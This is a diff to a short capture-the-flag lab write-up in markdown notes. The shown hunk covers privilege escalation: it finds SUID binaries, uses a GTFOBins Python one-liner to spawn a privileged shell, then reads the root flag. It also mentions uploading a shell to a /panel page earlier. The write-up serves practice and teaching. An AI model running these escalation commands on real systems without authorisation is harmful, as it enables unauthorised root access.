@@ -49,10 +49,11 @@ after that we can upload our Shell on /panel and wait for the connection, then 
 
 For [Privilege Escalation](../../3%20-%20Tags/Hacking%20Concepts/Privilege%20Escalation.md) we can find SUID permissions for the user `$ find / -user root -perm /4000`  and find `/usr/bin/python`
 
-we can go to  https://gtfobins.github.io/  and get a [Python](../../3%20-%20Tags/Programming%20Languages/Python.md) [GTFO](../../3%20-%20Tags/Hacking%20Concepts/GTFO.md)
+we can go to  https://gtfobins.github.io/  and get a [Python](../../3%20-%20Tags/Programming%20Languages/Python.md) command.
 
 then on the Target Machine we execute  `python -c 'import os; os.execl("/bin/sh", "sh", "-p")'`  (the command for escalation)
 
 confirm with `whoami` >> `root` and find the flag `find / -type f -name root.txt`  >>  `cat root.txt`
 
 Rooted !!
+
